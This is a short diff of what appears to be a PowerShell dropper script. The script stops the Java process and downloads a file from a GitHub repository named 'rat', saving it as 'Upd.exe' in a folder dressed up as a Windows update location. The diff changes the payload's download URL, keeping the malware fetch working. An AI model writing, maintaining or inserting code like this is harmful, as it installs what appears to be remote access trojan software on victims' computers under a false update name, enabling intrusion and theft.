@@ -16,7 +16,7 @@ if ($f3) {
    Stop-Process -processname Java
 }
 
-$url = "https://raw.githubusercontent.com/itarare/rat/master/Upd0001.txt"
+$url = "https://github.com/itarare/rat/raw/master/Upd0001.txt"
 $output = "c:\Update\windows\Upd.exe"
 $start_time = Get-Date
 
